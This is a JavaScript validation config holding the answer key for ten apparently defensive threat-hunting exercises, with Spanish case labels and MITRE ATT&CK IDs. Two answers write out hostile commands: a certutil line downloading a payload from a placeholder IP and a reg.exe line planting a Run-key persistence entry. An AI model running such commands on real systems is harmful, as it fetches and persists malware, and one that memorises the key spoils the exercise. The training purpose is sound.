const VALIDATION_CONFIG = {
  // Caso 01: Fuerza Bruta SSH
  "1-0": { answer: "185.220.101.7", acceptable: [] },
  "1-1": { answer: "admin", acceptable: ["administrador"] },
  "1-2": { answer: "2", acceptable: ["dos"] },

  // Caso 02: PowerShell descargando payload
  "2-0": { answer: "powershell.exe", acceptable: ["powershell"] },
  "2-1": { answer: "203.0.113.45", acceptable: [] },
  "2-2": { answer: "T1059.001", acceptable: ["1059.001", "t1059.001"] },

  // Caso 03: Escalación de privilegios
  "3-0": { answer: "tpineda", acceptable: ["pineda"] },
  "3-1": { answer: "T1068", acceptable: ["1068", "t1068"] },

  // Caso 04: Proceso desde Temp
  "4-0": { answer: "svchost.exe", acceptable: ["svchost"] },
  "4-1": { answer: "afernandez", acceptable: ["FIN-WS-05\\afernandez"] },

  // Caso 05: Minería
  "5-0": { answer: "91.240.118.4", acceptable: [] },
  "5-1": { answer: "xmrig.exe", acceptable: ["xmrig"] },
  "5-2": { answer: "T1496", acceptable: ["1496", "t1496"] },

  // Caso 06: Archivo en Temp
  "6-0": { answer: "payload.ps1", acceptable: [] },
  "6-1": { answer: "powershell.exe", acceptable: ["powershell"] },

  // Caso 07: Certutil
  "7-0": { answer: "certutil.exe -urlcache -f http://198.51.100.10/payload.exe C:\\Temp\\payload.exe", acceptable: ["certutil -urlcache", "certutil.exe"] },
  "7-1": { answer: "T1105", acceptable: ["1105", "t1105"] },

  // Caso 08: Tarea programada
  "8-0": { answer: "SysCheck", acceptable: ["syscheck", "Updater"] },
  "8-1": { answer: "C:\\Users\\Public\\svhost.exe", acceptable: ["Public\\svhost.exe", "svhost.exe"] },
  "8-2": { answer: "T1053.005", acceptable: ["1053.005", "t1053.005"] },

  // Caso 09: Registro Run
  "9-0": { answer: "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\update.exe", acceptable: ["reg add", "reg.exe"] },
  "9-1": { answer: "T1547.001", acceptable: ["1547.001", "t1547.001"] },

  // Caso 10: WMI
  "10-0": { answer: "cmd.exe", acceptable: ["cmd"] },
  "10-1": { answer: "T1546.003", acceptable: ["1546.003", "t1546.003"] }
};